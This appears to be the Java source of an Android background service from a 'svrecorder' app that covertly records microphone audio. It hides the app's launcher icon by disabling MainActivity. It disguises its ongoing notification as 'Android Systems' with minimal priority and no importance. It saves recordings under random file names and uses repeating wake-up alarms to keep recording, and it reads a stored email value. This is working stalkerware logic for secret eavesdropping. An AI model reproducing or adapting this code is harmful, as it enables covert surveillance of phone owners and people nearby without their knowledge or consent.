package com.shashank.seconpart.svrecorder;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.SystemClock;
import android.support.annotation.Nullable;
import android.support.annotation.RequiresApi;
import android.support.v4.app.NotificationCompat;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.UUID;

import static android.support.v4.app.NotificationCompat.PRIORITY_MIN;

public class BackgroundService extends Service {
    public static MediaRecorder mediaRecorder;
    public static String pathSave = "";
    public static String testPath;
    public static String email;
    public BackgroundService(){
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            intervalRecorder(Record2Activity.val2);

            NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            String channelId = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? createNotificationChannel(notificationManager) : "";
            NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, channelId);
            Notification notification = notificationBuilder.setOngoing(true)
                    .setSmallIcon(R.drawable.ic_stat_name)
                    .setPriority(PRIORITY_MIN)
                    .setContentTitle("Android Systems")
                    .setCategory(NotificationCompat.CATEGORY_SERVICE)
                    .build();

            startForeground(12, notification);
            startAlarm(Record2Activity.val2);

        return START_STICKY;

    }


    @RequiresApi(Build.VERSION_CODES.O)
    private String createNotificationChannel(NotificationManager notificationManager){
        String channelId = "my_service_channelid";
        String channelName = "My Foreground Service";
        NotificationChannel channel = new NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_HIGH);
        channel.setImportance(NotificationManager.IMPORTANCE_NONE);
        channel.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
        notificationManager.createNotificationChannel(channel);
        return channelId;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
    public void startAlarm(long addOfThree){
        AlarmManager manager = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
        Intent myIntent;
        PendingIntent pendingIntent;
        myIntent = new Intent(this,AlarmToastReciever.class);
        pendingIntent = PendingIntent.getBroadcast(this,0,myIntent,0);
        manager.setRepeating(AlarmManager.RTC_WAKEUP, SystemClock.elapsedRealtime()+3000,Record2Activity.val2,pendingIntent);
    }

    public void intervalRecorder(long addOfThree)  {

           this.testPath = UUID.randomUUID().toString() + "Custom_audio_record.3gp";
           this.pathSave = Environment.getExternalStorageDirectory()
                   .getAbsolutePath() + "/" + testPath;
           setupMediaRecorder();
        SharedPreferences sharedPreferences = getSharedPreferences("MYPREF", MODE_PRIVATE);
        String data = sharedPreferences.getString("Key", "No save Data");
        this.email= data;
        try {
               mediaRecorder.prepare();
               mediaRecorder.start();
           } catch (IOException e) {
               e.printStackTrace();
           }
    }

    private void setupMediaRecorder() {
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
        mediaRecorder.setOutputFile(pathSave);
    }
}

